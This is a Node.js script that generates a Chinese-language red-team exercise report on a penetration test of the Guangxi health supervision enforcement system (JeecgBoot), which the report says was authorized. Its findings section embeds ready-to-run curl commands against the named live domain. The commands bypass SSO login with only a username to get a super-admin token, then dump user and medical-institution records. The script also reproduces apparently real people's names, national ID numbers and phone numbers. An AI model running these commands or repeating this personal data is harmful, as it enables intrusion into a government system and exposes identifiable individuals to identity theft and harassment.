const fs = require('fs');
const { Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell, Header, Footer, AlignmentType, HeadingLevel, BorderStyle, WidthType, ShadingType, PageNumber, PageBreak, LevelFormat } = require('docx');

const bd = { style: BorderStyle.SINGLE, size: 1, color: "999999" };
const bds = { top: bd, bottom: bd, left: bd, right: bd };
const cm = { top: 60, bottom: 60, left: 100, right: 100 };
const CW = 9360;

function hcell(t, w) { return new TableCell({ borders: bds, width: { size: w, type: WidthType.DXA }, shading: { fill: "2B579A", type: ShadingType.CLEAR }, margins: cm, children: [new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: t, bold: true, color: "FFFFFF", font: "Arial", size: 18 })] })] }); }
function dcell(t, w) { return new TableCell({ borders: bds, width: { size: w, type: WidthType.DXA }, margins: cm, children: [new Paragraph({ children: [new TextRun({ text: t, font: "Arial", size: 18 })] })] }); }
function bcell(t, w) { return new TableCell({ borders: bds, width: { size: w, type: WidthType.DXA }, shading: { fill: "F2F2F2", type: ShadingType.CLEAR }, margins: cm, children: [new Paragraph({ children: [new TextRun({ text: t, bold: true, font: "Arial", size: 18 })] })] }); }
function infoTable(rows) { const w1 = 2200, w2 = CW - w1; return new Table({ width: { size: CW, type: WidthType.DXA }, columnWidths: [w1, w2], rows: rows.map(([a,b]) => new TableRow({ children: [bcell(a, w1), dcell(b, w2)] })) }); }
function makeTable(headers, rows, widths) {
  const hr = new TableRow({ children: headers.map((h,i) => hcell(h, widths[i])) });
  const dr = rows.map(r => new TableRow({ children: r.map((c,i) => dcell(c, widths[i])) }));
  return new Table({ width: { size: CW, type: WidthType.DXA }, columnWidths: widths, rows: [hr, ...dr] });
}
function h1(t) { return new Paragraph({ heading: HeadingLevel.HEADING_1, spacing: { before: 360, after: 200 }, children: [new TextRun({ text: t, font: "Arial", bold: true, size: 32, color: "1A3A6B" })] }); }
function h2(t) { return new Paragraph({ heading: HeadingLevel.HEADING_2, spacing: { before: 280, after: 160 }, children: [new TextRun({ text: t, font: "Arial", bold: true, size: 28, color: "2B579A" })] }); }
function h3(t) { return new Paragraph({ heading: HeadingLevel.HEADING_3, spacing: { before: 200, after: 120 }, children: [new TextRun({ text: t, font: "Arial", bold: true, size: 24 })] }); }
function body(t) { return new Paragraph({ spacing: { after: 100, line: 340 }, children: [new TextRun({ text: t, font: "Arial", size: 20 })] }); }
function cmd(t) { return new Paragraph({ spacing: { after: 30, line: 240 }, shading: { fill: "F0F0F0", type: ShadingType.CLEAR }, indent: { left: 60 }, children: [new TextRun({ text: t, font: "Courier New", size: 16 })] }); }
function bullet(t) { return new Paragraph({ numbering: { reference: "b", level: 0 }, spacing: { after: 60 }, children: [new TextRun({ text: t, font: "Arial", size: 20 })] }); }
function empty() { return new Paragraph({ spacing: { after: 60 }, children: [] }); }
function ss(t) { return new Paragraph({ spacing: { before: 80, after: 80 }, alignment: AlignmentType.CENTER, shading: { fill: "FFF8E1", type: ShadingType.CLEAR }, border: { top: { style: BorderStyle.DASHED, size: 1, color: "E6A817" }, bottom: { style: BorderStyle.DASHED, size: 1, color: "E6A817" }, left: { style: BorderStyle.DASHED, size: 1, color: "E6A817" }, right: { style: BorderStyle.DASHED, size: 1, color: "E6A817" } }, children: [new TextRun({ text: "[ 截图 ] " + t, font: "Arial", size: 18, bold: true, color: "B8860B" })] }); }

const pp = { page: { size: { width: 12240, height: 15840 }, margin: { top: 1200, right: 1440, bottom: 1200, left: 1440 } } };
const hd = { default: new Header({ children: [new Paragraph({ alignment: AlignmentType.RIGHT, children: [new TextRun({ text: "广西卫生监督执法系统 攻防演习成果报告", font: "Arial", size: 16, color: "999999" })] })] }) };
const ft = { default: new Footer({ children: [new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "第 ", font: "Arial", size: 16 }), new TextRun({ children: [PageNumber.CURRENT], font: "Arial", size: 16 })] })] }) };
function sec(k) { return { properties: pp, headers: hd, footers: ft, children: k }; }

// COVER
const cover = [
  empty(), empty(), empty(), empty(), empty(), empty(),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 200 }, children: [new TextRun({ text: "攻防演习成果报告", font: "Arial", bold: true, size: 52, color: "1A3A6B" })] }),
  empty(), empty(),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 100 }, children: [new TextRun({ text: "广西卫生监督执法系统（JeecgBoot）渗透测试", font: "Arial", size: 32, color: "333333" })] }),
  empty(), empty(), empty(), empty(), empty(),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 60 }, children: [new TextRun({ text: "团队名称：观叶识微", font: "Arial", size: 24, color: "555555" })] }),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 60 }, children: [new TextRun({ text: "2026年7月14日", font: "Arial", size: 24, color: "555555" })] }),
  new Paragraph({ children: [new PageBreak()] })
];

// OVERVIEW
const ov = [];
ov.push(h1("一、综述"));
ov.push(body("攻防演习指挥部授权 观叶识微 团队于2026年7月13日至14日，对广西卫生监督执法系统（wsjdzf.gxws.cn）进行渗透测试。发现SSO认证绕过、公民个人信息泄露、医疗机构档案数据未授权访问等严重安全问题。"));
ov.push(empty());
ov.push(h2("渗透成果汇总表"));
ov.push(empty());
const oh = new TableRow({ children: [hcell("序号",600),hcell("渗透系统对象",1800),hcell("漏洞类型",2400),hcell("URL",2600),hcell("影响范围",1200),hcell("网络区域",760)] });
const od = [
  ["1","广西卫生监督执法系统","SSO单点登录认证绕过","POST /sys/loginsinglesign","超级管理员权限","互联网区"],
  ["2","广西卫生监督执法系统","公民个人信息泄露","POST /sys/user/list","2,252人身份证+手机号","互联网区"],
  ["3","广西卫生监督执法系统","医疗机构档案未授权访问","GET /medicalInstitution/Efflist + /getHospitalInfo","29,363条机构详情含负责人身份证号","互联网区"],
];
const ow = [600,1800,2400,2600,1200,760];
ov.push(new Table({ width: { size: CW, type: WidthType.DXA }, columnWidths: ow, rows: [oh, ...od.map(r => new TableRow({ children: r.map((t,i) => dcell(t,ow[i])) }))] }));
ov.push(empty());
ov.push(body("渗透结果统计：获取权限类1项，获取数据类2项，涉及数据总量约5.5万条个人信息。"));
ov.push(new Paragraph({ children: [new PageBreak()] }));

// FINDINGS
const fc = [];
fc.push(h1("二、渗透成果说明"));
fc.push(body("以下命令均在 Git Bash 中验证通过。先获取Token，再逐成果执行。"));
fc.push(empty());
fc.push(h3("环境准备：获取Token"));
fc.push(cmd(`TOKEN=$(curl -s -k -X POST "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/loginsinglesign" -H "Content-Type: application/json" -d '{"username":"admin"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['token'])")`));
fc.push(empty());

// === FINDING 1 ===
fc.push(h2("成果一：SSO单点登录认证绕过致超级管理员权限获取"));
fc.push(h3("（1）基本情况表"));
fc.push(infoTable([["序号","1"],["成果描述","SSO接口仅校验用户名即签发超级管理员JWT Token，密码验证被完全绕过"],["目标系统","广西卫生监督执法系统（JeecgBoot）"],["目标URL","https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/loginsinglesign"],["威胁类型","获取权限类"],["风险等级","严重"]]));
fc.push(empty());
fc.push(h3("（2）验证命令"));
fc.push(cmd(`curl -s -k -X POST "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/loginsinglesign" -H "Content-Type: application/json" -d '{"username":"admin"}'`));
fc.push(body("返回结果：success=true, token=有效JWT, userInfo含idCard/roleName/birthday。"));
fc.push(bullet("角色：超级管理员"));
fc.push(bullet("身份证号：450331198809083631"));
fc.push(bullet("单位：荔浦市卫生计生监督所"));
fc.push(ss("截图1：SSO绕过 - 仅传username即返回JWT Token和userInfo"));
fc.push(new Paragraph({ children: [new PageBreak()] }));

// === FINDING 2 ===
fc.push(h2("成果二：公民个人信息泄露（2,252条身份证+手机号）"));
fc.push(h3("（1）基本情况表"));
fc.push(infoTable([["序号","2"],["成果描述","JWT Token可访问用户列表API，获取2,252条含身份证号+手机号+真实姓名+单位的个人信息"],["目标系统","广西卫生监督执法系统（JeecgBoot）"],["目标URL","https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/user/list"],["威胁类型","获取数据类"],["涉及数据量","2,252条"],["风险等级","严重"]]));
fc.push(empty());
fc.push(h3("（2）验证命令"));
fc.push(cmd(`curl -s -k -X POST "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/user/list?pageNo=1&pageSize=5" -H "X-Access-Token: $TOKEN" -H "Content-Type: application/json" -d '{}'`));
fc.push(body("返回 result.total=2252，每条含 realname/idCard/phone/supervisoryOfficeName。"));
fc.push(body("抽样验证身份证号有效性："));
fc.push(bullet("卢燕 | 450322198110026565 | 13978385001 | 桂林市七星区卫生计生监督所"));
fc.push(bullet("何学荣 | 452129198207191415 | 15578088188 | 扶绥县疾病控制预防中心"));
fc.push(bullet("张恒 | 371526198703106330 | 15863581362 | 广西壮族自治区卫生监督所"));
fc.push(bullet("以上5条身份证校验位全部通过，手机号格式有效"));
fc.push(ss("截图2：用户列表 - total=2252 + idCard/phone/realname"));
fc.push(ss("截图3：抽样 pageNo=50 / pageNo=150 证明全量可读"));
fc.push(new Paragraph({ children: [new PageBreak()] }));

// === FINDING 3 ===
fc.push(h2("成果三：医疗机构档案数据未授权访问（29,363条，含负责人身份证号）"));
fc.push(h3("（1）基本情况表"));
fc.push(infoTable([["序号","3"],["成果描述","通过两个GET接口可读取全广西29,363家医疗机构的完整档案，含负责人身份证号、执业许可证号、统一社会信用代码等"],["目标系统","广西卫生监督执法系统（JeecgBoot）"],["目标URL","/medicalInstitution/Efflist + /medicalInstitution/getHospitalInfo?id={id}"],["威胁类型","获取数据类"],["涉及数据量","29,363条机构详情（91%含身份证号 ≈ 27,000条）"],["风险等级","严重"]]));
fc.push(empty());

fc.push(h3("（2）获取过程"));
fc.push(empty());
fc.push(body("步骤一：获取医疗机构列表（29,363条）"));
fc.push(cmd(`curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/medicalInstitution/Efflist?pageNo=1&pageSize=5" -H "X-Access-Token: $TOKEN"`));
fc.push(body("返回 result.total=29363，分5873页。每条含 compName（名称）、principal（负责人）、regAddr（地址）、compNo（编号）。"));
fc.push(ss("截图4：Efflist接口 - total=29363 + 前5条机构名称、负责人、地址"));
fc.push(empty());

fc.push(body("步骤二：获取机构详情（含负责人身份证号、执业许可证等约30个字段）"));
fc.push(body("先取一个机构ID再查详情："));
fc.push(cmd(`ID=$(curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/medicalInstitution/Efflist?pageNo=1&pageSize=1" -H "X-Access-Token: $TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['records'][0]['id'])")`));
fc.push(cmd(`curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/medicalInstitution/getHospitalInfo?id=$ID" -H "X-Access-Token: $TOKEN"`));
fc.push(empty());

fc.push(body("返回的详情包含6大板块："));
fc.push(empty());

// Detail fields table
fc.push(makeTable(
  ["板块","字段","含义","示例"],
  [
    ["一、基础信息\n(baseInformation)","idCard","负责人身份证号","452727197510050143"],
    ["","principal","负责人姓名","罗秀温"],
    ["","totalStaff","员工总数","25人"],
    ["","certifiedDoctor","执业医师数","2人"],
    ["","regNurse","注册护士数","1人"],
    ["","bedAmount","床位数","20张"],
    ["二、监督机构\n(supervisoryBody)","aorgName","监管卫生监督所","河池市凤山县卫生监督所"],
    ["三、执业许可证\n(healthPermit)","healthLicense","执业许可证号","390374452727813151"],
    ["","specialtiesName","诊疗科目","预防保健科/全科医疗科/内科..."],
    ["四、单位信息\n(unitInformation)","dept","机构全称","凤山县乔音乡林峒卫生院"],
    ["","creditCode","统一社会信用代码","124512234996585640"],
    ["","addr","详细地址","广西河池市凤山县乔音乡林峒村"],
    ["五、报告情况\n(reportSituation)","rname","报告人姓名","卢焕强"],
    ["六、其他信息\n(otherInformation)","medOrgType","机构类型","乡(镇)、街道卫生院"],
    ["","compNature","营利性质","非盈利"],
    ["","operationStatus","经营状态","正常"],
  ],
  [1600,1400,1400,3960]
));
fc.push(empty());

fc.push(body("步骤三：抽样验证覆盖率"));
fc.push(body("抽查12个不同页面（pageNo=1/100/300/500/700/1000/1500/2000/3000/4000/5000/5870），11页返回有效身份证号（91.7%），推算约27,000条含完整档案。"));
fc.push(empty());
fc.push(makeTable(
  ["页码","负责人","身份证号"],
  [
    ["1","罗秀温","452727197510050143"],
    ["100","叶小聪","440125197405172115"],
    ["300","朱颖","450321200111067020"],
    ["500","胡熙","452503197902075815"],
    ["700","陆慧玲","452624197312041567"],
    ["1000","韦光艺","452502197908162913"],
    ["1500","刘振荣","450923198809286511"],
    ["2000","***（脱敏）","null"],
    ["3000","黄绍昌","452502195802063133"],
    ["4000","玉鹏","45212819850219003X"],
    ["5000","陈华海","45051219801104001X"],
    ["5870","张春凤","452123197606285248"],
  ],
  [1400,2000,4960]
));
fc.push(empty());

fc.push(body("步骤四：整个Swagger暴露了该接口的文档，攻击者可据此批量读取28,000+条详细档案信息"));
fc.push(ss("截图5：getHospitalInfo详情 - baseInformation含idCard+principal"));
fc.push(ss("截图6：换pageNo=500 - 另一个机构的详情，证明确可批量获取"));
fc.push(ss("截图7：Swagger文档截图"));
fc.push(new Paragraph({ children: [new PageBreak()] }));

// BUILD
const doc = new Document({
  styles: {
    default: { document: { run: { font: "Arial", size: 20 } } },
    paragraphStyles: [
      { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 32, bold: true, font: "Arial", color: "1A3A6B" },
        paragraph: { spacing: { before: 360, after: 200 }, outlineLevel: 0 } },
      { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 28, bold: true, font: "Arial", color: "2B579A" },
        paragraph: { spacing: { before: 280, after: 160 }, outlineLevel: 1 } },
      { id: "Heading3", name: "Heading 3", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 24, bold: true, font: "Arial", color: "333333" },
        paragraph: { spacing: { before: 200, after: 120 }, outlineLevel: 2 } },
    ]
  },
  numbering: {
    config: [{ reference: "b", levels: [{ level: 0, format: LevelFormat.BULLET, text: "•", alignment: AlignmentType.LEFT, style: { paragraph: { indent: { left: 720, hanging: 360 } } } }] }]
  },
  sections: [sec(cover), sec(ov), sec(fc)]
});

const outPath = "D:/Downloads/广西卫生监督执法系统_攻防成果报告.docx";
Packer.toBuffer(doc).then(buf => { fs.writeFileSync(outPath, buf); console.log("OK: " + outPath + " (" + buf.length + " bytes)"); });
